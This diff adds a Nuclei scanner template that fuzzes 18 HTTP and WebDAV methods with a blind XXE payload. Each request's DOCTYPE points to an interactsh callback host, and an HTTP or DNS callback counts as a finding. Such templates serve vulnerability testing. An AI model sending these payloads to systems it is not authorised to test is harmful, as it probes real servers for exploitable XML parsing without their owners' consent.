@@ -1,0 +1,160 @@
+id: xxe_dev_methods
+info:
+  name: xxe_dev_methods
+  author: raff
+  severity: high
+  description: Fuzzing 
+
+requests:
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        SEARCH {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        UNLINK {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        LINK {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        MOVE {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        COPY {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo>  
+      - |
+        MERGE {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        CHECKIN {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        CHECKOUT {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        REPORT {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        UNLOCK {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        LOCK {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        MKCOL {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        PROPFIND {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        PUT {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        PATCH {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        DELETE {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+      - |
+        CONNECT {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE foo PUBLIC "-//dummy//Bug//dummy"  "http://{{interactsh-url}}/">
+        <foo>testing</foo> 
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
